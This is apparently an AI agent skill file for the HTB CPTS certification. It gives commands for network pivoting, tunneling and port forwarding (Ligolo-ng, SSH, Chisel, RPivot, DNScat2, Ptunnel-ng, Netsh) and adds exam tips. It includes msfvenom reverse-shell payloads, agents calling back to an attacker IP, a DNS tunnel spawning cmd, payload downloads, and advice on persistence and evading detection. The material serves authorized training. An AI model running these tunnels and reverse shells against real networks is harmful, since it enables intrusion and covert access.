---
name: cpts-lateral-movement
description: "CPTS Lateral Movement & Network Pivoting: Ligolo-ng setup and usage, pivoting/tunneling techniques, port forwarding (SSH local/remote/dynamic, Chisel, Socat, Netsh, Plink), and CPTS exam tips. Use when needing to pivot through compromised hosts or establish tunnels for internal network access."
argument-hint: "[pivot-type] [options]"
allowed-tools:
  - read
  - grep
  - glob
  - exec
  - webfetch
triggers:
  - user
  - model
---

> **⚠️ AUTHORIZED USE ONLY ⚠️**
>
> This skill file is intended for **authorized penetration testing, security research, and educational purposes only**. All techniques described herein — including pivoting, tunneling, port forwarding, and lateral movement — must **only** be used against systems and networks for which you have **explicit written authorization**.
>
> Unauthorized access to computer systems is illegal. Misuse of these techniques may violate local, state, federal, and international laws. The authors and distributors of this material assume no liability for any misuse.
>
> **Use responsibly. Know your scope. Respect the law.**

---

# CPTS Lateral Movement & Network Pivoting

## Purpose

This skill provides a comprehensive reference for lateral movement and network pivoting techniques covered in the Hack The Box Certified Penetration Testing Specialist (CPTS) course. It covers:

- **Ligolo-ng** — TUN-based pivoting proxy with advanced double-pivot capabilities
- **Pivoting, Tunneling & Port Forwarding** — SSH, Chisel, Socat, Plink, SSHuttle, RPivot, DNScat2, Ptunnel-ng, Windows Netsh PortProxy, Proxychains, Metasploit routing
- **CPTS Exam Tips** — Preparation guidance and exam-day strategies

---

## 1. Ligolo-ng

Ligolo-ng is a tunneling tool that creates a TUN interface on the attacker machine, allowing full network access through a compromised host. It uses TLS-encrypted WebSocket connections and behaves like a VPN rather than a SOCKS proxy, making it fast and reliable.

### Steps

#### 1. Agent Acquisition

- Download the correct Ligolo-ng agent binary for the compromised host's OS from the official GitHub releases.
- Transfer the agent binary to the compromised host.

#### 2. Proxy Initialization (Attacker Machine)

**Create TUN Interface:**

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

**Start Ligolo-proxy:**

- Lab Environment (Self-Signed):

```bash
ligolo-proxy -selfcert
```

- Production/Realistic Test (Trusted CA):

```bash
ligolo-proxy -certfile <cert.pem> -keyfile <key.pem>
```

_(Replace `<cert.pem>` and `<key.pem>` with your certificate and key file paths.)_

#### 3. Agent Connection (Compromised Host)

**Execute Agent:**

```bash
./agent -connect <Attacker_IP>:11601 -ignore-cert
```

_(Use `-ignore-cert` ONLY with self-signed certificates. Replace `<Attacker_IP>` with your attacker machine's IP.)_

#### 4. Tunnel Establishment (Attacker Machine)

**Ligolo-proxy Session:**

- Use the Ligolo-proxy command-line interface to select the active agent session.

**Routing Configuration:**

```bash
sudo ip route add <Target_Network_CIDR> dev ligolo
```

_(Replace `<Target_Network_CIDR>` with the target network's CIDR notation, e.g., `192.168.1.0/24`.)_

**Start Tunnel:**

- Within the Ligolo-proxy session, type:

```bash
start
```

#### 5. Verification and Usage (Attacker Machine)

- Use tools like Nmap, Metasploit, or any other network tool to interact with the target network as if you were directly connected.

#### 6. Advanced (Double Pivoting)

**Second TUN:**

```bash
sudo ip tuntap add user $USER mode tun ligolo-double
sudo ip link set ligolo-double up
```

**Listener Forwarding:**

```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

**Second Agent:**

- Execute the agent on the next compromised host, connecting to the first compromised host's forwarded port.

**Second Route:**

```bash
sudo ip route add <Second_Target_Network_CIDR> dev ligolo-double
```

### Key Considerations

- **Certificates:** Use trusted certificates for real-world scenarios to avoid detection.
- **Listeners:** Ensure proper listeners are set for reverse shells and file transfers.
- **Routing:** Verify correct routing configurations to avoid connectivity issues.
- **Environment Variables:** Using `$USER` makes the TUN interface creation more portable.
- **CIDR Notation:** Recommends using CIDR notation for network routes, which is standard practice.
- **Safety:** Clearly explains when to use the `-ignore-cert` flag.

---

## 2. Pivoting, Tunneling & Port Forwarding

### Network Configuration and Monitoring

```bash
# Display network configurations
ifconfig  
### Linux command to display current network configurations.

ipconfig  
### Windows command to display current network configurations.

# Display routing table
netstat -r  
### Displays the routing table for all IPv4-based protocols.

# Netstat for monitoring
netstat -antp | grep 1234  
### Linux: Filter network connections for port 1234.

netstat -antb | findstr 1080  
### Windows: List TCP connections on port 1080.
```

---

### Nmap

```bash
# Basic port scanning
nmap -sT -p22,3306 <IPaddressofTarget>  
### Scan for open SSH or MySQL ports.

nmap -v -sV -p1234 localhost  
### Scan localhost on port 1234 with version detection.
```

---

### SSH and Tunneling

```bash
# SSH tunneling
ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>  
### Create SSH tunnel to remote MySQL service.

ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>  
### SSH tunnel for multiple ports.

ssh -D 9050 ubuntu@<IPaddressofTarget>  
### Dynamic port forwarding for SOCKS proxy.

ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN  
### Reverse SSH tunnel.
```

**SSH Tunnel Types Summary:**

| Flag | Type | Description |
|------|------|-------------|
| `-L` | Local Port Forwarding | Forwards a local port to a remote host:port via the SSH server |
| `-R` | Remote Port Forwarding | Forwards a remote port back to the local machine (useful for inbound firewalls) |
| `-D` | Dynamic Port Forwarding | Creates a SOCKS proxy on the local machine for routing traffic through the SSH server |
| `-vN` | Verbose + No Command | Verbose output without executing a remote command (background tunnel) |

---

### Proxychains

```bash
# Proxychains configuration
tail -4 /etc/proxychains.conf  
### View last 4 lines of proxychains config.

# Proxychains usage
proxychains nmap -v -sn 172.16.5.1-200  
### Proxychains with Nmap ping scan.

proxychains msfconsole  
### Launch Metasploit through Proxychains.
```

**Proxychains Configuration Notes:**
- Edit `/etc/proxychains.conf` to add your SOCKS proxy (e.g., `socks5 127.0.0.1 9050`).
- Three modes available: `dynamic_chain`, `strict_chain`, `random_chain`.
- Use with SSH dynamic forwarding (`-D`), Chisel, or RPivot SOCKS proxies.

---

### Metasploit

```bash
# Module search and usage
msf6 > search rdp_scanner  
### Search for RDP scanner module.

msf6 > use exploit/multi/handler  
### Select multi-handler module.

msf6 > use auxiliary/server/socks_proxy  
### Use SOCKS proxy module.

msf6 auxiliary(server/socks_proxy) > jobs  
### List running jobs.

msf6 > use post/multi/manage/autoroute  
### Select autoroute module.
```

**Metasploit Pivoting Workflow:**
1. Compromise a host and obtain a Meterpreter session.
2. Use `post/multi/manage/autoroute` to add routes through the session to internal subnets.
3. Use `auxiliary/server/socks_proxy` to create a SOCKS proxy for non-Metasploit tools.
4. Configure Proxychains to use the Metasploit SOCKS proxy.
5. Run tools (Nmap, etc.) through Proxychains to reach the internal network.

---

### File Transfer

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/  
### SCP file transfer to remote host.

scp -r rpivot ubuntu@<IPaddressOfTarget>  
### SCP entire directory to target.

# Python HTTP server
python3 -m http.server 8123  
### Start HTTP server on port 8123.

# PowerShell file download
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"  
### Download file using PowerShell.
```

---

### Metasploit Payloads

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080  
### Create Windows reverse HTTPS payload.

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPofAttackHost> -f elf -o backupjob LPORT=8080  
### Create Linux reverse TCP payload.
```

**Payload Pivoting Notes:**
- When pivoting, set `LHOST` to the **internal IP of the pivot host** so the payload calls back through the pivot.
- Use `reverse_https` or `reverse_tcp` depending on egress filtering on the target network.
- For Windows targets, format as `.exe`; for Linux, use `.elf`.

---

### Socat

```bash
socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80  
### Forward port 8080 to attack host port 80.
```

**Socat Usage Notes:**
- `fork` option allows multiple concurrent connections.
- Useful for quick port forwarding on compromised Linux hosts.
- Can also relay UDP traffic with `UDP4-LISTEN` and `UDP4`.

---

### Plink

```bash
plink -D 9050 ubuntu@<IPaddressofTarget>  
### Plink dynamic port forwarding.
```

**Plink Usage Notes:**
- Plink is the command-line version of PuTTY for Windows.
- `-D` creates a dynamic SOCKS proxy (equivalent to SSH `-D`).
- Useful on Windows compromised hosts to establish a SOCKS proxy back to the attacker.
- Can also use `-L` for local forwarding and `-R` for remote forwarding.

---

### SSHuttle

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v  
### Create route through target network.
```

**SSHuttle Usage Notes:**
- SSHuttle creates a transparent VPN-like tunnel over SSH without requiring a SOCKS proxy.
- Routes specified subnets through the SSH connection automatically.
- No need for Proxychains — tools work natively as if directly connected.
- Requires root (`sudo`) and Python on the remote host.
- Can route multiple subnets: `sudo sshuttle -r user@host 172.16.5.0/24 10.10.10.0/24 -v`

---

### RPivot

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0  
### Start RPivot server.

python2.7 client.py --server-ip 10.10.14.18 --server-port 9999  
### Connect RPivot client to server.
```

**RPivot Usage Notes:**
- RPivot creates a reverse SOCKS proxy — the client (on the compromised host) connects back to the server (attacker).
- Useful when the target has outbound firewalls that block inbound connections but allow outbound.
- The server listens on `--server-port` and exposes a SOCKS proxy on `--proxy-port`.
- Requires Python 2.7 on both ends.
- Configure Proxychains to use the SOCKS proxy port (`9050` in the example).

---

### DNScat2

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache  
### Start DNScat2 server.

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd  
### PowerShell client connection.
```

**DNScat2 Usage Notes:**
- DNScat2 tunnels traffic over DNS — useful when only DNS traffic is allowed outbound.
- Requires a DNS server authoritative for a domain you control.
- The server runs in Ruby; the client can run on Windows via PowerShell.
- `--no-cache` prevents DNS caching issues during testing.
- Pre-shared secret provides authentication between client and server.
- `-Exec cmd` spawns a command shell through the DNS tunnel.
- Slow but effective for highly restricted network environments.

---

### Chisel

```bash
./chisel server -v -p 1234 --socks5  
### Start Chisel server.

./chisel client -v 10.129.202.64:1234 socks  
### Connect Chisel client to server.
```

**Chisel Usage Notes:**
- Chisel is a fast TCP/UDP tunnel over HTTP with SOCKS5 support.
- Written in Go — single static binary for multiple platforms.
- Server runs on the attacker machine; client runs on the compromised host.
- `--socks5` enables SOCKS5 proxy on the server.
- Client connects and establishes a SOCKS proxy tunnel back to the server.
- Configure Proxychains to use `socks5 127.0.0.1 1080` (default Chisel SOCKS port).
- Can also do reverse port forwarding: `./chisel server -p 1234 --reverse` and `./chisel client <server>:1234 R:1080:socks`

---

### Ptunnel-ng

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22  
### Start Ptunnel-ng server.

sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22  
### Connect Ptunnel-ng client.
```

**Ptunnel-ng Usage Notes:**
- Ptunnel-ng tunnels TCP connections over ICMP echo requests (ping).
- Useful when only ICMP traffic is allowed through a firewall.
- `-r` specifies the remote destination IP; `-R` specifies the remote destination port.
- `-p` specifies the proxy host (where the ptunnel server runs); `-l` specifies the local listening port.
- After connecting, SSH to `localhost:2222` to reach the target's SSH port via ICMP tunnel.
- Requires root (`sudo`) for raw socket access (ICMP).

---

### Windows PortProxy (Netsh)

```powershell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25  
### Add portproxy rule.

netsh.exe interface portproxy show v4tov4  
### Show portproxy configuration.
```

**Windows PortProxy Usage Notes:**
- `netsh interface portproxy` is a built-in Windows utility for port forwarding — no third-party tools needed.
- `listenport` / `listenaddress` — where the proxy listens (on the pivot host).
- `connectport` / `connectaddress` — where traffic is forwarded to (the internal target).
- Useful for forwarding RDP (3389), SMB (445), WinRM (5985), etc. through a compromised Windows host.
- To delete a rule: `netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.42.198`
- Requires administrator privileges on the Windows pivot host.
- Persists across reboots (stored in registry).

---

## 3. CPTS Exam Tips

These tips are for preparing for the CPTS exam from Hack The Box (HTB), which is estimated to be at a difficulty level between OSCP and OSEP, but with more guidance. These tips are also valid for CBBH, CDSA, and CWEE, but more specific tips will come over time.

### Master Port Forwarding and Pivoting

- Be proficient in navigating networks by establishing connections to and from other machines.
- Understand how to bypass outbound and inbound firewalls and access isolated networks, especially with chained and linked hosts.

### Manage Multiple Sessions

- Get comfortable with handling multiple sessions simultaneously (e.g., one low-privileged user and one system-level session per machine).
- Practice switching contexts (whether it is Meterpreter, Sliver, etc.)

### Implement Persistence Mechanisms

- Establish persistence from both the victim to your Kali machine (e.g., via services or startup items) and from your Kali machine to the victim (e.g., using SSH keys, RDP, or local administrator access).
- Ensure your sessions stay stable, particularly if your VPN connection drops.

### Maintain Payloads and Notes

- Keep a record of the payloads and notes that worked for giving you access.
- Test your payloads (Mimikatz, Rubeus, PowerView, etc.) in advance; do not discover the features of Meterpreter or pivoting techniques on the exam day.
- Create a personal cheatsheet for quick reference.
- Be cautious as some payloads found online may not work for plenty of possibilities. Ensure you have a local copy that worked correctly during your labs.

### Exam Requirements

- You must capture **12 out of 14 flags** to pass the exam, so when you have them, make sure you have all proofs before going deeper.
- The report is very long — up to two days to complete, make sure you have free time to do it!

---

## Quick Reference: Tool Selection Guide

| Scenario | Recommended Tool | Notes |
|----------|-----------------|-------|
| Full VPN-like access through pivot | **Ligolo-ng** | TUN interface, fastest, supports double pivoting |
| Transparent routing over SSH | **SSHuttle** | No SOCKS proxy needed, native tool routing |
| SOCKS proxy over SSH | **SSH `-D`** + Proxychains | Standard, reliable, widely available |
| Reverse SOCKS (outbound-only target) | **RPivot** | Client connects back to attacker |
| SOCKS proxy with Go binary | **Chisel** | Fast, cross-platform, supports reverse mode |
| ICMP-only tunneling | **Ptunnel-ng** | Tunnels TCP over ICMP ping |
| DNS-only tunneling | **DNScat2** | Tunnels over DNS queries |
| Quick port forward on Linux | **Socat** | Simple, one-line forward |
| Windows native port forward | **Netsh PortProxy** | No third-party tools, persists across reboot |
| Windows SSH tunneling | **Plink** | PuTTY CLI, supports `-D`, `-L`, `-R` |
| Metasploit-based pivoting | **Autoroute + SOCKS proxy** | Route through Meterpreter sessions |
| Double pivoting | **Ligolo-ng** (listener_add) | Chain tunnels through multiple hosts |

---

## Quick Reference: Common Ports for Pivoting

| Port | Service | Use Case |
|------|---------|----------|
| 22 | SSH | SSH tunneling, SSHuttle, Plink |
| 53 | DNS | DNScat2 tunneling |
| 80 / 443 | HTTP/S | Chisel, reverse HTTPS payloads |
| 1080 | SOCKS | Default SOCKS proxy port (Chisel, SSH) |
| 3389 | RDP | Port forwarding to internal RDP |
| 8080 | HTTP Proxy | Common Ligolo/Chisel/Socat listener |
| 9050 | SOCKS | Default Proxychains / RPivot / SSH `-D` |
| 11601 | Ligolo | Default Ligolo-ng proxy port |
